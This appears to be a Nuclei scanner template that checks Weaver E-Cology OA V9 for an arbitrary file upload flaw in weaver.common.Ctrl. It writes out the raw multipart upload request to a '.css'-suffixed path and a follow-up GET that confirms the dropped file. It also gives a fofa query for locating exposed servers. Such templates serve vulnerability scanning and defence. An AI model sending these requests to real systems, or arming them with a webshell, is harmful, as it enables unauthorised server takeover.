id: weaver-ecology-common-Ctrl-fileupload

info:
  name: 泛微 OA E-Cology weaver.common.Ctrl - fileupload
  author: leadlife
  severity: critical
  description: 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20weaver.common.Ctrl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  metadata:
    verified: false
    fofa-query: app="泛微-协同办公OA"
    version: 泛微OA V9
  tags: weaver,ecology,fileupload,oa

variables:
  shellcode: '{{hex_decode(base64_decode(""))}}'

http:
  - raw:
      - |
        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo

        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
        Content-Disposition: form-data; name="file"; filename="XasdaASA.zip"
        Content-Type: application/zip

        {{shellcode}}
        -----WebKitFormBoundaryFy3iNVBftjP6IOwo--

      - |
        GET /cloudstore/XasdaASA.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200  && status_code_2 == 200
          - contains(body_2, "BugTest")
        condition: and

